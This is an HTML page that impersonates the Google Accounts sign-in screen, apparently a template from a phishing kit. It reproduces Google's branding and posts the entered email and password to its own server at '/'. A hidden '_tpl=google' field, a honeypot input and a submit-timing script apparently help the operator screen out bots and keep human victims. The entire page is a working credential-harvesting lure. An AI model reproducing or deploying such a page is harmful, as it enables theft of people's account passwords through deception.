<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Sign in - Google Accounts</title>
<meta name="theme-color" content="#4285F4">
<meta name="referrer" content="strict-origin-when-cross-origin">
<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%234285F4%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EG%3C/text%3E%3C/svg%3E">
<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%234285F4%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EG%3C/text%3E%3C/svg%3E">
<meta property="og:title" content="Sign in - Google Accounts">
<meta property="og:site_name" content="Google">
<style>
  body { margin:0;min-height:100vh;background:#fff;color:#202124;
         font-family:'Google Sans',Roboto,-apple-system,BlinkMacSystemFont,'Segoe UI',
                     Helvetica,Arial,sans-serif;display:flex;flex-direction:column; }
  .top { padding:16px 24px; }
  .wrap { flex:1;display:flex;justify-content:center;align-items:flex-start;
          padding:8px 24px 48px; }
  .box { width:100%;max-width:450px; }
  .box .logo { margin:0 0 20px; }
  h1 { font-size:24px;font-weight:400;margin:0 0 8px;letter-spacing:0; }
  .sub { font-size:16px;color:#202124;margin:0 0 28px; }
  .field { position:relative;margin-bottom:26px; }
  .field input { width:100%;padding:15px 14px;font-size:16px;color:#202124;
                 background:transparent;border:1px solid #dadce0;border-radius:4px;
                 outline:none;box-sizing:border-box; }
  .field input:focus { border:2px solid #4285F4;padding:14px 13px; }
  .field label { position:absolute;left:13px;top:-9px;background:#fff;padding:0 4px;
                 font-size:12px;color:#5f6368; }
  .row { display:flex;align-items:center;gap:12px;margin:0 0 8px; }
  .row .spacer { flex:1; }
  .row a { color:#4285F4;font-size:14px;font-weight:500;text-decoration:none; }
  .btn { background:#4285F4;color:#fff;border:0;border-radius:4px;padding:10px 26px;
         font-size:14px;font-weight:500;cursor:pointer; }
  .btn:hover { background:#1a73e8; }
  .foot { display:flex;justify-content:space-between;font-size:12px;color:#5f6368;
          padding:20px 24px;max-width:900px;margin:0 auto;width:100%;box-sizing:border-box; }
  .foot a { color:#5f6368;text-decoration:none;margin-left:22px; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
</style>
</head>
<body>
<div class="top"></div>
<div class="wrap">
<div class="box">
  <div class="logo"><svg viewBox="0 0 48 48" width="48" height="48" role="img" aria-label="Google"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z"/><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/></svg></div>
  <h1>Sign in</h1>
  <p class="sub">Use your Google Account</p>
  <form method="POST" action="/">
    <div class="field float">
      <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="username" required>
      <label for="email">Email</label>
    </div>
    <div class="field float">
      <input id="password" name="password" type="password" placeholder="Enter your password" autocomplete="current-password" required>
      <label for="password">Enter your password</label>
    </div>
    <div class="row"><a href="#">Forgot email?</a><span class="spacer"></span><a href="#">Create account</a></div>
    <div class="row"><span class="spacer"></span><button class="btn" type="submit">Next</button></div>

  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
  <input type="hidden" name="_tpl" value="google">
  <input type="hidden" name="_ts" value="__TS__">

<script>
/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
   record it, and we log how long the form was open (bot forms are instant). */
(function(){
  var t0 = Date.now();
  var f = document.querySelector('form');
  if(!f) return;
  f.addEventListener('submit', function(){
    var el = f.querySelector('input[name=_ts]');
    if(el) el.value = String(Date.now() - t0);
  });
})();
</script>
  </form>
</div>
</div>
<div class="foot"><span>English (United States)</span><span><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></span></div>
</body>
</html>
